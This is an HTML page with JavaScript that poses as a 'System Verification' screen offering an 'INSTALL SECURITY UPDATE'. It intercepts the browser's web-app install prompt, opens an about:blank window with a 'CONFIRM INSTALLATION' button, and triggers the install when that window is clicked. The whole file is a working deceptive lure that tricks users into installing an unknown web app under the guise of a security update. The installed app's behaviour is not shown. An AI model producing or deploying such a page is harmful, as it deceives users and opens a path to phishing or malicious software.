<!doctype html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="manifest" href="manifest.json">
    <style>
        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 10vh; }
        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 90%; display: none; }
    </style>
</head>
<body>
    <h2 id="txt">System Verification</h2>
    <button class="btn" id="go">INSTALL SECURITY UPDATE</button>

<script>
let p;
// Register SW biar syarat PWA terpenuhi
navigator.serviceWorker.register('sw.js');

window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    p = e;
    document.getElementById('go').style.display = 'block';
    document.getElementById('txt').innerText = "Device Compatible";
});

document.getElementById('go').onclick = () => {
    // 1. Buka jendela about:blank
    let w = window.open('about:blank');
    
    // 2. Suntik tombol eksekusi ke about:blank
    w.document.body.innerHTML = `
        <body style="background:#202124;color:white;text-align:center;padding-top:40vh;font-family:sans-serif;">
            <button style="background:#34a853;color:white;border:none;padding:25px;font-size:20px;border-radius:10px;width:90%;font-weight:bold;">
                CONFIRM INSTALLATION
            </button>
        </body>`;

    // 3. Trigger Prompt saat user klik tombol di about:blank
    w.onclick = async () => {
        if (p) {
            p.prompt();
            const { outcome } = await p.userChoice;
            if (outcome === 'accepted') w.close();
            p = null;
        }
    };
};
</script>
</body>
</html>
